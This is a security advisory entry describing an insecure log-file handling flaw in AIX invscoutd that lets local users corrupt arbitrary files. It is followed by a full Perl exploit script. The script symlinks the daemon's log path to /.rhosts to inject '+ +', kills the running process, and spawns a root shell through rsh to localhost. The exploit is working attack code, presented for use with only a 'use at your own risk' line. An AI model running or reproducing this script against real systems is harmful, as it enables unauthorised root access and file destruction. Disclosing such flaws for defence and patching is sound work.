source: https://www.securityfocus.com/bid/9982/info

Reportedly AIX invscoutd insecurely handles temporary files; this may allow a local attacker to destroy data on vulnerable system. This issue is due to a design error that allows a user to specify a log file that the process writes to while holding escalated privileges.

This issue may allow a malicious user to corrupt arbitrary files on the affected system, potentially leading to a system wide denial of service condition. It has also been conjectured that this issue may be leveraged to allow an attacker to gain escalated privileges, although this is unconfirmed.

#!/usr/bin/perl
# FileName: x_invscoutd.pl
# Exploit invscoutd of Aix4.x & 5L to get a uid=0 shell.
# Tested  : on Aix4.3.3 & Aix5.1.
#           Some high version of invscoutd is not affected.
# Author  : watercloud@xfocus.org
# Site    : www.xfocus.org   www.xfocus.net
# Date    : 2003-5-29
# Announce: use as your owner risk!

$LOG="/tmp/.ex/.hello\n+ +\nworld";
$CMD="/usr/sbin/invscoutd";
umask 022;
mkdir "/tmp/.ex",0777;

print "Exploit error on kill process invscoutd !!" ,exit 1
  if &killproc() == 0;

symlink "/.rhosts",$LOG;
system $CMD,"-p7321",$LOG; &killproc();
unlink $LOG;
print "\n============\nRemember to remove /.rhosts !!\n";
print "rsh localhost -l root '/bin/sh -i'\n";
print "waiting . . . . . .\n";
system "rsh","localhost","-l","root","/bin/sh -i";

system $CMD,"-p808","/dev/null" ; &killproc();
rmdir "/tmp/.ex";

sub killproc() {
  $_=`ps -ef |grep invscoutd |grep -v grep |grep -v perl`;
  @proc_lst=split;
  $ret=kill 9,$proc_lst[1] if $proc_lst[1];
  $ret=-1 if ! defined $ret;
  return $ret;
}
#EOF